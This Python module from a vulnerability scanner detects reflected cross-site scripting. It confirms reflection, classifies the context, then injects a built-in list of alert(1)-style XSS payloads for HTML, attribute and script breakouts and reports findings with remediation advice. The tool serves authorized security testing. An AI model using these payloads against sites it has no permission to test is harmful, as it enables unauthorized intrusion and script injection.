"""Cross-Site Scripting (XSS) detection module.

Detection strategy:
  1. Probe — inject a unique marker and confirm it is reflected in the response.
  2. Context detection — determine whether the reflection lands in an HTML tag,
     an attribute, or a JavaScript block.
  3. Payload validation — inject context-appropriate payloads and verify that
     dangerous characters (< > " ') reach the browser unencoded.
"""

import hashlib
import re
import time
from typing import Dict, List, Optional, Tuple

import logging

from .base import BaseModule, Finding
from ..parser import build_curl_command, inject_into_params, rebuild_url_with_params

logger = logging.getLogger("vulnscanner")

# ---------------------------------------------------------------------------
# Payload library
# ---------------------------------------------------------------------------
_PAYLOADS_HTML = [
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<sCrIpT>alert(1)</ScRiPt>',
    '<img/src=x onerror=alert(1)>',
    '<<script>alert(1)//<</script>',
    '<iframe src="javascript:alert(1)">',
    '<a href=javascript:alert(1)>x</a>',
]

_PAYLOADS_ATTR = [
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '" onblur="alert(1)',
    '" onclick="alert(1)',
    '" onerror="alert(1)',
]

_PAYLOADS_SCRIPT = [
    '</script><script>alert(1)</script>',
    '";alert(1)//',
    "';alert(1)//",
    '\';alert(1)//',
    '\\";alert(1)//',
]

# Combined default order (HTML first, then attr/script)
_DEFAULT_PAYLOADS = _PAYLOADS_HTML + _PAYLOADS_ATTR + _PAYLOADS_SCRIPT


class XSSScanner(BaseModule):
    """Detects reflected XSS vulnerabilities with context-aware payload selection."""

    NAME = "xss"

    def __init__(self, http_client, config: Dict) -> None:
        super().__init__(http_client, config)
        self.custom_payloads: Optional[str] = config.get("custom_payloads")

    # ------------------------------------------------------------------
    # Public entry-point
    # ------------------------------------------------------------------

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        """Test *param_name* for reflected XSS."""
        # Phase 1: confirm reflection exists at all
        reflected, context = self._probe_reflection(url, method, params, param_name)
        if not reflected:
            logger.debug("[XSS] %s: no reflection — skipping payload phase", param_name)
            return []

        logger.debug("[XSS] %s: reflected in context=%s", param_name, context)

        # Phase 2: inject real payloads
        finding = self._test_payloads(url, method, params, param_name, context)
        return [finding] if finding else []

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _send(self, url: str, method: str, params: Dict[str, str]):
        if method == "GET":
            return self.http.get(rebuild_url_with_params(url, params))
        return self.http.post(url, data=params)

    def _probe_reflection(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> Tuple[bool, str]:
        """Inject a unique alphanumeric token and verify it echoes back unmodified.

        Baseline check: if the token somehow appears in the response WITHOUT
        injection (practically impossible for a random 8-hex suffix, but safe
        to guard against), the probe is invalid.
        """
        token = "xssprobe" + hashlib.md5(
            f"{param_name}{time.perf_counter()}".encode()
        ).hexdigest()[:8]

        # Get baseline to confirm the token is not already in the page
        baseline = self._send(url, method, params)
        if baseline is not None and token.lower() in baseline.text.lower():
            # Token appears without injection — astronomically rare, but skip if so
            return False, "unknown"

        resp = self._send(url, method, inject_into_params(params, param_name, token))
        if resp is None or token.lower() not in resp.text.lower():
            return False, "unknown"

        context = self._detect_context(resp.text, token)
        return True, context

    @staticmethod
    def _detect_context(html: str, probe: str) -> str:
        """Classify where the probe appears in the HTML response."""
        idx = html.lower().find(probe.lower())
        if idx == -1:
            return "html"

        snippet = html[max(0, idx - 120): idx + len(probe) + 120]

        if re.search(
            r'<script[^>]*>[^<]*' + re.escape(probe),
            snippet,
            re.IGNORECASE | re.DOTALL,
        ):
            return "script"

        if re.search(
            r'<[^>]+\s[\w:-]+=(["\'])[^\'"]*' + re.escape(probe),
            snippet,
            re.IGNORECASE,
        ):
            return "attribute"

        return "html"

    def _test_payloads(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
        context: str,
    ) -> Optional[Finding]:
        """Inject payloads matching the detected context; confirm unencoded reflection."""
        payloads = self.load_payloads(_DEFAULT_PAYLOADS, self.custom_payloads)

        # Prioritise payloads that suit the detected context
        if context == "attribute":
            priority = _PAYLOADS_ATTR + _PAYLOADS_HTML
            payloads = priority + [p for p in payloads if p not in priority]
        elif context == "script":
            priority = _PAYLOADS_SCRIPT + _PAYLOADS_HTML
            payloads = priority + [p for p in payloads if p not in priority]

        for payload in payloads:
            resp = self._send(url, method, inject_into_params(params, param_name, payload))
            if resp is None:
                continue

            confirmed, evidence = self._check_unencoded(resp.text, payload)
            if confirmed:
                logger.debug(
                    "[XSS] %s=%r reflected unencoded in %s context",
                    param_name, payload, context,
                )
                curl = build_curl_command(url, method, params, param_name, payload)
                return Finding(
                    vuln_type="Cross-Site Scripting (Reflected XSS)",
                    url=url,
                    method=method,
                    parameter=param_name,
                    payload=payload,
                    evidence=evidence,
                    confidence="high",
                    details=(
                        f"XSS payload reflected without encoding in {context!r} context. "
                        f"Payload: {payload!r}. "
                        "Remediation: HTML-encode all user-supplied output; "
                        "apply a strict Content-Security-Policy."
                    ),
                    reproduction=(
                        f"# 1. Send the XSS payload and check if it appears unencoded:\n"
                        f"{curl}\n"
                        f"# 2. Search for the payload in the response body:\n"
                        f"$ # Grep for: {payload}\n"
                        f"# 3. If the payload is NOT HTML-encoded (< > not replaced by &lt; &gt;),\n"
                        f"#    the XSS is confirmed.\n"
                        f"# 4. To verify in a browser: paste the payload in the '{param_name}'\n"
                        f"#    field and submit. An alert box confirms execution.\n"
                        f"# 5. For a clean PoC screenshot, use: {payload}"
                    ),
                )
        return None

    @staticmethod
    def _check_unencoded(html: str, payload: str) -> Tuple[bool, str]:
        """Return (True, evidence_snippet) only when the EXACT payload appears unencoded.

        Why verbatim-only?
        Pages always contain legitimate <script> tags, onerror= attributes, and
        similar HTML from their own JavaScript. Checking for these fragments without
        anchoring to the injected payload produces false positives on any page with
        client-side code.

        Verbatim match means: the scanner injected '<script>alert(1)</script>'
        and that exact string appears in the response body without HTML-encoding.
        If the site encodes < to &lt; the payload will not match — which is correct,
        because a properly-encoded response is NOT vulnerable to XSS.
        """
        if payload in html:
            idx = html.index(payload)
            start = max(0, idx - 40)
            end = min(len(html), idx + len(payload) + 40)
            snippet = html[start:end].replace("\n", " ")
            return True, f"Payload reflected verbatim (unencoded): ...{snippet!r}..."

        return False, ""
